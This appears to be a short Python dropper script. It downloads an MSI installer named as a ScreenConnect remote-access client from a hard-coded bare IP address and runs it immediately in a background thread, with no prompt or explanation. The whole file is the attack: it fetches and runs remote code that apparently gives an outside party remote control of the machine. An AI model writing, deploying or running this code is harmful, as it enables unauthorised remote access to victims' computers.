import threading
import urllib.request
import os
import tempfile

def download_and_run(url):
    temp_dir = tempfile.gettempdir()
    file_path = os.path.join(temp_dir, 'ScreenConnect.ClientSetup.msi')
    with urllib.request.urlopen(url) as response, open(file_path, 'wb') as out_file:
        while True:
            chunk = response.read(8192)
            if not chunk:
                break
            out_file.write(chunk)
    os.startfile(file_path)

url = 'http://87.121.84.32:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
thread = threading.Thread(target=download_and_run, args=(url,))
thread.start()
